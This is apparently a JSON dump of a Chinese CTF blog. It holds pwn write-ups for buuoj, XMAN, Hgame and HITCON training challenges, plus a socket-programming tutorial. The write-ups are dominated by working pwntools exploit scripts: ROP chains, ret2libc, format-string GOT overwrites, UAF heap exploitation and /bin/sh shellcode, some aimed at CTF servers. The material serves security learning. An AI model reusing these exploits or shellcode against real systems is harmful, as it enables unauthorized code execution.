\"administrator\")3233 addlog('a'*0x4c + p32(elf.plt['system']) + p32(0xdeadbeef) + p32(elf.search('sh\\0').next()))3435 p.sendlineafter(\"0.Exit\\n:\", str(4))3637 p.interactive()3839 if __name__ == '__main__':40 pwn()","tags":[{"name":"buuoj, PWN","slug":"buuoj-PWN","permalink":"http://wafuter.jxustctf.top/tags/buuoj-PWN/"}]},{"title":"linux网络编程-第一篇","date":"2020-01-18T14:40:01.000Z","path":"2020/01/18/linux网络编程-第一篇/","text":"字节序与网络字节序转换byte ordering 有两种， 分别是小端序（Little-Endian）和大端序（Big-Endian）Big-Endian 又称为 Network Byte Order，因为这个顺序与我们网路型别的顺序一样 如果不知道本地字节顺序与网络字节顺序是否一致， 可以通过函数来进行转换从而保持一致比如, 将 short 从 Host Byte Order 转换为 Network Byte Order，用＂h＂代表＂host＂，用＂n＂代表＂network＂，而＂s＂代表＂short＂，所以是：h-to-n-s，或者htons()［读做：＂Host to Network Short＂］你可以用任何你想要的方式来组合＂n＂丶＂h＂丶＂s＂与＂l＂，不过别用太蠢的组合，比如：没有这样的函数 stolh() htons() host to network shorthtonl() host to network longntohs() network to host shortntohl() network to host long 数据结构12345678910struct addrinfo &#123; int ai_flags; // AI_PASSIVE, AI_CANONNAME等。 int ai_family; // AF_INET, AF_INET6, AF_UNSPEC int ai_socktype; // SOCK_STREAM, SOCK_DGRAM int ai_protocol; // 用 0 当作 \"any\" size_t ai_addrlen; // ai_addr 的大小, 单位是 Byte struct sockaddr \\*ai_addr; // struct sockaddr_in 或 \\_in6 char \\*ai_canonname; // 典型的hostname struct addrinfo \\*ai_next; //链表 下个节点&#125;; ai_family 栏位中设定强制使用 IPv4 或 IPv6，或者将它设定为 AF_UNSPEC，AF_UNSPEC 很酷，因为这样你的程序就可以不用管 IP 的版本 1234struct sockaddr &#123; unsigned short sa_family; // address family, AF_xxx char sa_data[14]; // 14 bytes of protocol address&#125;; sa_family 可以是任何东西，不过在这份教程中我们会用到的是 AF_INET［IPv4］或 AF_INET6［IPv6］。sa_data 包含一个 socket 的目地地址与 port number。这样很不方便，因为你不会想要手动的将地址封装到 sa_data 里。 为了处理 struct sockaddr，程序设计师建立了对等平行的数据结构：struct sockaddr_in［＂in＂是代表＂internet＂］而这有个重点：指向 struct sockaddr_in 的指针可以转型（cast）为指向 struct sockaddr 的指针，反之亦然。所以即使 connect() 需要一个 struct sockaddr *，你也可以用 struct sockaddr_in，并在最後的时候对它做型别转换！ IPv412345678910struct sockaddr_in &#123; short int sin_family; // Address family, AF_INET unsigned short int sin_port; // Port number struct in_addr sin_addr; // Internet Address unsigned char sin_zero[8]; // 与 struct sockaddr 相同的大小&#125;;struct in_addr &#123; uint32_t s_addr; // that's a 32-bit int (4 bytes)&#125;; 这个数据结构让它很容易可以参考（reference）socket 地址的成员。要注意的是 sin_zero［这是用来将数据结构补足符合 struct sockaddr 的长度］，应该要使用 memset()函数将 sin_zero 整个清为零。还有，sin_family 是对应到 struct sockaddr 中的 sa_family，并应该设定为＂AF_INET＂。最後，sin_port 必须是 Network Byte Order［利用 htons()］ IPv61234567891011struct sockaddr_in6 &#123; u_int16_t sin6_family; // address family, AF_INET6 u_int16_t sin6_port; // port number, Network Byte Order u_int32_t sin6_flowinfo; // IPv6 flow information struct in6_addr sin6_addr; // IPv6 address u_int32_t sin6_scope_id; // Scope ID&#125;;struct in6_addr &#123; unsigned char s6_addr[16]; //IPv6 address&#125;; 要注意到 IPv6 协议有一个 IPv6 address 与一个 port number，就像 IPv4 协议有一个 IPv4 address 与 port number 一样IPv6的流量资料与Scope ID 暂未接触 IP address 的的转换 inet_pton() 函数将 IP address 转换为数值与句号的符号，并依照你指定的 AF_INET 或 AF_INET6 来决定要储存在 struct in_addr 或 struct in6_addr,［＂pton＂的意思是＂presentation to network＂，你可以称之为＂printable to network＂ 示例 1234struct sockaddr_in sa; // IPv4struct sockaddr_in6 sa6; // IPv6inet_pton(AF_INET, \"192.0.2.1\", &amp;(sa.sin_addr)); // IPv4inet_pton(AF_INET6, \"2001:db8:63b3:1::3490\", &amp;(sa6.sin6_addr)); // IPv6 以数字与句号(.)打印出struct in_addr或以十六进制与冒号打印出struct in6_addr 可以使用 inet_ntop()函数［＂ntop＂意谓＂network to presentation＂－如果有比较好记的话，你可以称它为＂network to prinable＂］ 示例 12345678910// IPv4:char ip4[INET_ADDRSTRLEN]; // 储存 IPv4 字符串的空间struct sockaddr_in sa; // pretend this is loaded with somethinginet_ntop(AF_INET, &amp;(sa.sin_addr), ip4, INET_ADDRSTRLEN);printf(\"The IPv4 address is: %s\\n\", ip4);// IPv6:char ip6[INET6_ADDRSTRLEN]; // 储存 IPv6 字符串的空间struct sockaddr_in6 sa6; // pretend this is loaded with somethinginet_ntop(AF_INET6, &amp;(sa6.sin6_addr), ip6, INET6_ADDRSTRLEN);printf(\"The address is: %s\\n\", ip6); 当你调用它时，你会传递地址的型别［IPv4 或 IPv6］，该地址是一个指向储存结果的字符串，与该字符串的最大长度。［有两个 macro（宏）可以很方便地储存你想储存的最大 IPv4 或 IPv6 地址字符串大小：INET_ADDRSTRLEN 与 INET6_ADDRSTRLEN］ 最後，这些函数只能用在数值的 IP address 上","tags":[{"name":"Netword Programming","slug":"Netword-Programming","permalink":"http://wafuter.jxustctf.top/tags/Netword-Programming/"}]},{"title":"buuoj-babyrop-writeup","date":"2020-01-18T05:39:28.000Z","path":"2020/01/18/buuoj-babyrop-writeup/","text":"这题只看了程序里面的函数没有观察plt里面的函数导致忽视了puts函数， 用write函数泄露libc地址…, 之后各种栈迁移最后终于成功写出exp后发现好像栈迁移到bss段的话system函数执行不了， 执行到一半总会出现段错误， 隔天在看程序突然发现plt表有puts函数…., 那就简单多了T_T read函数不会被’\\0’截断， 所以利用’\\0’就可以绕过那个检查， 之后就是常规的rop了 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 1 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 011 d = 11213 def pwn():14 execve = \"./babyrop\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"node3.buuoj.cn\"22 host = \"29458\"23 p = remote(ip, host)2425 elf = ELF(\"./babyrop\")26 libc = ELF(\"./bp_libc-2.23.so\")27 #libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2829 def write_of():30 payload = '\\x00'*0x6 + '\\0' + '\\xff'31 p.send(payload.ljust(0x20, '\\x00'))3233 write_of()3435 start = 0x080485A036 payload = '\\x00'*(0xe7 + 4) + p32(elf.plt['puts']) + p32(start) + p32(elf.got['puts'])37 p.send(payload.ljust(0xff, '\\x00'))3839 p.recvuntil(\"Correct\\n\")4041 leak = u32(p.recv(4))42 libc_base = leak - libc.symbols['puts']43 log.info(\"libc_base -&gt; \" + hex(libc_base))4445 write_of()4647 #one_gadget = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5]48 one_gadget = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819, 0x5f065]4950 payload = '\\x00'*(0xe7 + 4) + p32(libc_base+one_gadget[0])51 p.send(payload.ljust(0xff, '\\x00'))525354 p.interactive()5556 if __name__ == '__main__':57 pwn()","tags":[{"name":"PWN, buuoj","slug":"PWN-buuoj","permalink":"http://wafuter.jxustctf.top/tags/PWN-buuoj/"}]},{"title":"XMAN-no_call  复现","date":"2020-01-17T14:52:17.000Z","path":"2020/01/17/XMAN-no-call-复现/","text":"这题看的时候没想到一点办法..保护全开， 系统调用全部禁止， 束手无策T_T 看了大佬的exp后才知道可以爆破， 以前没怎么接触这回长见识了 程序中要求输入的shellcode长度限制在0x10个字节内， 思路明确是爆破flag， flag所在的地址直接观察mmap函数可以知道是0x200000000, 那么只要用字符对这个地址的内容进行多次比较检验就可以爆破出flag exp: 1234567891011121314151617181920212223242526272829301 from pwn import *2 from string import printable34 context.arch = 'amd64'56 flag = 0x2000000007 flagx = ''89 for j in range(0x20):10 for i in printable:11 s = process(\"./chall\")12 payload = \"\"\"13 mov rax, &#123;&#125;14 cmp byte ptr [rax], &#123;&#125;15 jz $ // $ 代本身这条指令的地址， 如果flag中的字符与printable的字符相等， 那么程序会一直往本指令跳转， 会出现等同于程序暂停的状态， 后面的recv的timeout就是测试是否爆破成功的16 ret17 \"\"\".format(hex(j+flag), ord(i))1819 s.recv()20 s.send(asm(payload))2122 try:23 s.recv(timeout=1)24 flagx += i25 print flagx26 break27 except :28 continue2930 log.info(\"flag -&gt; \" + flag) //脚本跑的时候不知道为什么总会崩到， 这条语句总是没有执行， 不过靠上面的print flagx也可以观察爆破情况","tags":[{"name":"PWN, XMAN_2019","slug":"PWN-XMAN-2019","permalink":"http://wafuter.jxustctf.top/tags/PWN-XMAN-2019/"}]},{"title":"Hgame-week1-writeup","date":"2020-01-17T07:15:01.000Z","path":"2020/01/17/Hgame-week1-writeup/","text":"Hard_AAAAA由于memcmp 函数要比较的是7个字节， 观察IDA中的数据就可以构造payload了 123456789101112131415161718192021222324252627282930311 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 011 d = 01213 def pwn():14 execve = \"./Hard_AAAAA\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"47.103.214.163\"22 host = \"20000\"23 p = remote(ip, host)2425 payload = 'a'*(0xac - 0x31) + \"0O0o\\0\" + \"O0\\0\"26 p.sendlineafter(\"Let's 0O0o\\\\0O0!\", payload)2728 p.interactive()2930 if __name__ == '__main__':31 pwn() Number_Killed保护全关 仔细观察程序逻辑可以发现for循环内存在缓存区溢出，再靠考虑程序保护全关， 比较容易想到植入shellcode程序中存在一个gift函数， 看伪代码也许不懂什么作用， 但是观察汇编代码的话会发现有条jmp rsp 指令， 这就有了明确的做题思路 –覆盖ret为jmp rsp 指令的地址， 后面植入shellcode， 之后就可以getshell了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647481 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 #context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 011 d = 11213 def pwn():14 execve = \"./Number_Killer\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"47.103.214.163\"22 host = \"20001\"23 p = remote(ip, host)2425 elf = ELF(\"./Number_Killer\")26 jmp_rsp = 0x40078D27 shellcode = \"\\x48\\x31\\xc0\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\x48\\x31\\xd2\\x48\\x31\\xf6\\xb0\\x3b\\x0f\\x05\"2829 p.recvuntil(\"Let's Pwn me with numbers!\")3031 for i in range(13):32 p.sendline('47550060152') # 0xD123456783334 p.sendline(str(int(jmp_rsp)))3536 p.sendline(str(7075083856935661896))37 p.sendline(str(5212749937626803817))38 p.sendline(str(-706703598913263735))39 p.sendline(str(int(0x50f3bb0)))4041 raw_input()4243 p.send('\\n'*2)4445 p.interactive()4647 if __name__ == '__main__':48 pwn() One_Shotname, flag 都是位于bss段的变量， 而且name与flag的间距为32个字节， 所以只要控制这32个字节不出现截断即可把flag输出 12345678910111213141516171819202122232425262728293031321 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 #context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 011 d = 01213 def pwn():14 execve = \"./One_Shot\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"47.103.214.163\"22 host = \"20002\"23 p = remote(ip, host)242526 p.sendlineafter(\"Firstly....What's your name?\\n\", 'a'*31)27 p.sendafter(\"Take tne only one shot!\\n\", str(int(0x6010DF)))2829 p.interactive()3031 if __name__ == '__main__':32 pwn() ROP_LEVEL0main 函数中的最后一个read函数存在溢出， 但是题目没给libc， 题目又是64位的， nc连上去题目提示不能直接catflag， 只能通过open， read等函数将flag输出来那么可以利用下面的通用gadget来调用这些函数最终读出flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556571 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 011 d = 11213 def pwn():14 execve = \"./ROP_LEVEL0\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"47.103.214.163\"22 host = \"20003\"23 p = remote(ip, host)2425 elf = ELF(\"./ROP_LEVEL0\")2627 main = 0x40065B28 loc1 = 0x40073029 loc2 = 0x40074A3031 payload = '\\x00'*(0x50+8) + p64(loc2)32 payload += p64(0) + p64(1) + p64(elf.got['read']) + p64(0x10) + p64(elf.bss()+0x200) + p64(0) + p64(loc1)33 payload += p64(0)*7 + p64(main)34 p.sendafter(\"You can not only cat flag but also Opxx Rexx Wrxxx ./flag\", payload.ljust(0x100, '\\x00'))3536 p.sendline('./flag\\0')3738 payload = '\\x00'*(0x50+8) + p64(loc2)39 payload += p64(0) + p64(1) + p64(elf.got['open']) + p64(0)*2 + p64(elf.bss()+0x200) + p64(loc1)40 payload += p64(0)*7 + p64(main)41 p.sendafter(\"You can not only cat flag but also Opxx Rexx Wrxxx ./flag\", payload.ljust(0x100, '\\x00'))4243 raw_input()44 payload = '\\x00'*(0x50+8) + p64(loc2)45 payload += p64(0) + p64(1) + p64(elf.got['read']) + p64(0x60) + p64(elf.bss()+0x220) + p64(5) + p64(loc1)46 payload += p64(0)*7 + p64(main)47 p.sendafter(\"You can not only cat flag but also Opxx Rexx Wrxxx ./flag\", payload.ljust(0x100, '\\x00'))4849 payload = '\\x00'*(0x50+8) + p64(loc2)50 payload += p64(0) + p64(1) + p64(elf.got['puts']) + p64(0)*2 + p64(elf.bss() + 0x220) + p64(loc1)51 payload += p64(0)*7 + p64(main)52 p.sendafter(\"You can not only cat flag but also Opxx Rexx Wrxxx ./flag\", payload.ljust(0x100, '\\x00'))5354 p.interactive()5556 if __name__ == '__main__':57 pwn() 结果：","tags":[{"name":"PWN, Hgame","slug":"PWN-Hgame","permalink":"http://wafuter.jxustctf.top/tags/PWN-Hgame/"}]},{"title":"HITCONING training 6-10 writeup","date":"2020-01-07T02:57:55.000Z","path":"2020/01/07/HITCONING-training-6-10-writeup/","text":"migrationemmm, 这题的做法跟前面的一道题差不多， 都可以泄露libc地址，进行栈迁移， 然后执行system函数来getshell， 差不多的思路就不重复写了 crack除了pie和改写重定位表以外的保护都开了 程序逻辑为从urandom文件中读取4个字节作为password， 由于urandom这个文件的内容是随机的， 所以password不可控， 但是后面有个格式化字符串漏洞，并且参数在栈上， 那么可以利用”%10$s” 泄露出password， 之后就可以cat flag了 1234567891011121314151617181920212223242526272829303132333435363738391 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./crack\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./crack\")2627 payload = p32(elf.symbols['password']) + \"%10$s\"28 p.sendlineafter(\"What your name ? \", payload)2930 p.recv(11)31 leak = u32(p.recv(4))32 log.info(\"leak -&gt; \" + hex(leak))3334 p.sendlineafter(\"Your password :\", str(leak))3536 p.interactive()3738 if __name__ == '__main__':39 pwn() cat flag: craxme开了NX和CANARY 又是一个格式化控制字符串漏洞的题目， 不过这次不是要我们泄露数据， 而是向内存中写入数据一个为218一个为0xfaceb00c(-87117812)第一个好解决， 第二个需要分段写入， %hn往内存中写入两个字节 12345678910111213141516171819202122232425262728293031323334351 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./craxme\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./craxme\")2627 #payload = p32(elf.symbols['magic']) + \"%&#123;&#125;c%7$n\".format(218 - 4) flag28 payload = p32(elf.symbols['magic']) + \"%&#123;&#125;c%7$hn&gt;&gt;&gt;&gt;\".format((0xfaceb00c &amp; 0xffff)-4)29 payload += p32(elf.symbols['magic']+2) + \"%&#123;&#125;c%12$hn\".format((0xfaceb00c &gt;&gt; 16) - 0xb00c - 4 - 4)30 p.sendlineafter(\"Give me magic :\", payload)3132 p.interactive()3334 if __name__ == '__main__':35 pwn() cat flag: playfmt= = 格式化字符串漏洞三连… 只开了NX 这题printf的参数不在栈上在bss段， 但是可以无限次利用这个漏洞， 所以思路还是有得， 不过比较麻烦， 覆写got表需要在一次printf调用中完成，这就使得需要很多准备工作 1.利用 序号1 处得两个方框内栈的地址之间的指向关系， 将地址0xff849628 的内容改成strncmp 的got表地址2.再利用 序号2 处的方框内的的栈的地址之间的指向关系， 将地址0xff8496e4 的内容改成strncmp的got表地址+23.之后就是向strncmp_got内写入system的低两个字节， strncmp_got+2内写入system的高两个字节， 这样就可以成功覆盖strncmp的got表内容为system4.最后就是输入buf为/bin/sh 就可以getshell了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485861 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./playfmt\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./playfmt\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 str_got = elf.got['strncmp']2930 p.recvline()31 p.recvline()32 p.recvline()3334 p.sendline(\"%10$p\")35 leak = int(p.recvline()[:-1], 16)3637 payload = \"%&#123;&#125;c%10$hn\\0\".format(str_got &amp; 0xffff)38 p.send(payload.ljust(0xc8, '\\x00'))3940 payload = \"%&#123;&#125;c%6$hn&gt;&gt;\\0\".format((leak &amp; 0xffff) + 2)41 p.send(payload.ljust(0xc8, '\\x00'))4243 payload = \"%&#123;&#125;c%10$hn\".format(str_got &gt;&gt; 16)44 p.send(payload.ljust(0xc8, '\\x00'))4546 payload = \"%8$p\"47 p.send(payload.ljust(0xc8, '\\x00'))4849 p.recvuntil(\"@&gt;&gt;\")50 p.recvuntil(\"@\")51 leak_libc = int(p.recv(10), 16)52 log.info(\"leak_libc -&gt; \" + hex(leak_libc))5354 libc_base = leak_libc - libc.symbols['_IO_2_1_stdout_']55 log.info(\"libc_base -&gt; \" + hex(libc_base))56 system = libc_base + libc.symbols['system']5758 payload = \"&gt;&gt;&gt;%21$p\"59 p.send(payload.ljust(0xc8, '\\x00'))6061 p.recvuntil(\"&gt;&gt;&gt;\")62 leak_stack = int(p.recv(10), 16)63 log.info(\"leak_stack -&gt; \" + hex(leak_stack))64 # strncmp_got + 265 #0xe4 -&gt; 5766 payload = \"%&#123;&#125;c%22$hn\".format((leak_stack &amp; 0xffff) + 2)67 p.send(payload.ljust(0xc8, '\\x00'))6869 payload = \"%&#123;&#125;c%21$hn\".format((str_got &amp; 0xffff) + 2)70 p.send(payload.ljust(0xc8, '\\x00'))7172 payload = \"%&#123;&#125;c%59$hn\".format(str_got &gt;&gt; 16)73 p.send(payload.ljust(0xc8, '\\x00'))7475 payload = \"%&#123;&#125;c%14$hn\".format(system &amp; 0xffff)76 payload += \"%&#123;&#125;c%57$hn\".format((system &gt;&gt; 16) - (system &amp; 0xffff))77 p.send(payload.ljust(0xc8, '\\x00'))7879 payload = '/bin/sh\\0'80 p.send(payload.ljust(0xc8, '\\x00'))8182 p.interactive()8384 if __name__ == '__main__':85 pwn() getshell hacknote开了NX和CANARY 是个堆类型的题目， 在del_note中存在UAF漏洞， 限制的chunk的个数最多为5， 第一时间想到两种利用方式， 1.控制程序中的print_note函数中的函数指针2.进行常规的fastbin attack， 不过限制了chunk的大小， 而且感觉第一种更方便， 所以就用第一种了 利用思路：在print_note中调用的函数指针， 只要控制了函数指针指向system函数就可以达到getshell的目的， 具体步骤 1.创建一个大小大于fastbin大小的chunk， 随后free掉， 在分配一个大小不大于这个chunk的chunk， 随后利用print_note函数泄露libc地址2.这个程序的chunk结构chunk 的 data区data -&gt; &amp;print_note_contentdata+4 -&gt; 输入的数据data+… -&gt; 输入的数据或0 由于箭头指向的malloc是程序中分配的，不可控， 所以需要利用UAF漏洞重用这段chunk来让data -&gt; system 3.释放两个chunk， 在malloc(8)输入数据为p32(system) + “||sh\\0” 即可达成目的 由于题目也准备好了后门， 直接让data-&gt; &amp;magic也行 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162631 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./hacknote\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 def add(size, content):26 p.sendlineafter(\"Your choice :\", str(1))27 p.sendlineafter(\"Note size :\", str(size))28 p.sendafter(\"Content :\", content)2930 def free(index):31 p.sendlineafter(\"Your choice :\", str(2))32 p.sendafter(\"Index :\", str(index))3334 def printf(index):35 p.sendafter(\"Your choice :\", str(3))36 p.sendafter(\"Index :\", str(index))3738 add(0x100, 'a') #039 add(0x20, 'b') #140 add(0x20, 'c') #241 free(0)42 add(0x100, '&gt;&gt;&gt;&gt;') #3 -&gt; 043 printf(3)4445 p.recvuntil(\"&gt;&gt;&gt;&gt;\")46 leak = u32(p.recvline()[:-1])47 libc_base = leak - (0xf7f5f7b0 - 0xf7dad000)48 log.info(\"leak -&gt; \" + hex(libc_base))4950 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")51 system = libc_base + libc.symbols['system']5253 free(1)54 free(2)55 raw_input()56 add(8, p32(system) + \"||sh\\0\") #457 printf(1)585960 p.interactive()6162 if __name__ == '__main__':63 pwn() getshell","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"HITCON training 1-5 writeup ","date":"2020-01-05T08:29:00.000Z","path":"2020/01/05/HITCON-training-writeup/","text":"由于期末考的原因， 好久没写题了， 做hitcon training 的题目来熟悉熟悉 sysmagic查看保护可以看到程序没开pie与got， plt 表之类的可以改写 程序逻辑比较简单不啰嗦了， 经过观察buf的值不可控但是flag比较明显是for循环内输出的东西， 而putchar 内的数据代码中都有， 所以第一想法是写个C语言脚本直接输出 1234567891011121314151617 1 #include &lt;stdio.h&gt; 2 #include &lt;string.h&gt; 3 #include &lt;stdlib.h&gt; 4 5 int main(int argc, char **argv)&#123; 6 int d[] = &#123;2036297540, 1801418095, 1601662830, 1601792119, 1952414061, 7 1835884901, 1600484449, 1851880015, 1767859559, 8 1869832051, 1735287135, 1061124466, 63&#125;; 9 char s[] = &#123;7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89,10 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0,11 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91,12 49, 85, 2, 30, 33, 16, 76, 30, 66&#125;;13 for(int i = 0;i &lt;= 0x30;++i)&#123;14 putchar(*((char*)d + i) ^ s[i]);15 &#125;16 return 0;17 &#125; flag: 看到flag的瞬间毫无防备的留下了弱者的泪水， 能动态调试为什么要费时间写脚本呢… orw查看保护除了栈溢出保护其它保护全关了 程序逻辑简单， 要求输入shellcode来执行指令， 不过程序用了沙箱禁用了exceve系统调用， 不过没有禁用read, write, open等系统调用， 所以可以通过执行这三个系统调用直接把flag读出来关于沙箱这篇文章讲的比较详细：seccomp学习笔记通过执行seccomp-tools dump ./orw 可以查看可以执行哪些系统调用系统调用号查询:linux 系统调用号表 汇编代码(我用的是ATT格式)： 12345678910111213141516171819202122232425262728291 .section .text2 .globl _start3 4 _start:5 xor %eax, %eax6 movl $0x804A09b, %ebx7 movl $4, %ecx8 xor %edx, %edx9 movb $5, %al10 int $0x8011 12 movl %eax, %ebx13 pushl %esp14 movl %esp, %ecx15 movl $0x30, %edx16 xor %eax, %eax17 movb $3, %al18 int $0x8019 20 movl $1, %ebx21 pushl %esp22 popl %ecx23 movl $0x30, %edx24 xor %eax, %eax25 movb $4, %al26 int $0x8027 28 movl $1, %eax29 int $0x80 成功读取flag(由于没有靶机， 所以我在本地创建了一个flag文件) ret2sc保护全关 看到程序逻辑就是栈迁移执行shellcode具体步骤为将shellcode植入到bss段， 之后再将栈迁移到bss段中，然后就可以getshell了 1234567891011121314151617181920212223242526272829303132333435361 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 11213 def pwn():14 execve = \"./ret2sc\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2sc\")2627 shellcode = p32(elf.symbols['name'] + 4) + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"28 p.sendlineafter(\"Name:\", shellcode)2930 payload = 'a'*(0x14+8) + p32(elf.symbols['name'] - 4) + p32(0x804853c)31 p.sendlineafter(\"Try your best:\", payload)3233 p.interactive()3435 if __name__ == '__main__':36 pwn() 成功getshell ret2lib除了栈上数据不可执行以外的保护全关了 程序逻辑分析：程序中可以指定一个地址并且输出这个地址的内容， 随后的print_message函数中很明显存在栈溢出 那么思路就比较明了了， 先泄露libc地址， 随后计算出libc基址，之后利用栈溢出执行system， 最后getshell由于泄露地址后可以直接利用LibcSearcher 搜索出libc版本， 为了方便我直接用本机的libc版本 123456789101112131415161718192021222324252627282930313233343536373839404142434445461 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./ret2lib\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2lib\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 p.sendlineafter(\"Give me an address (in dec) :\", str(elf.got['puts']))29 leak = hex(int(p.recvline()[-9:-1], 16))30 log.info(\"leak -&gt; \" + leak)3132 libc_base = int(leak, 16) - libc.symbols['puts']33 log.info(\"libc_base -&gt; \" + hex(libc_base))3435 system = libc_base + libc.symbols['system']36 binsh = libc_base + libc.search('/bin/sh\\0').next()3738 pppr = 0x080486CD39 payload = 'a'*(0x38 + 4) + p32(system) + p32(0x12345678) + p32(binsh)4041 p.sendlineafter(\"Leave some message for me :\", payload)4243 p.interactive()4445 if __name__ == '__main__':46 pwn() 成功getshell simplerop除了NX其它全关 观察程序逻辑只有一个栈溢出， 而这个文件是个静态链接的文件，尝试找system的地址， 但是查找符号表没找到system但是open, write, read的地址都可以找到， 这意味着跟前面的题目思路一样， 利用rop调用这三个函数来读取flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546471 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./simplerop\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./simplerop\")2627 pppr = 0x080491D22829 payload = 'a'*(0x1c 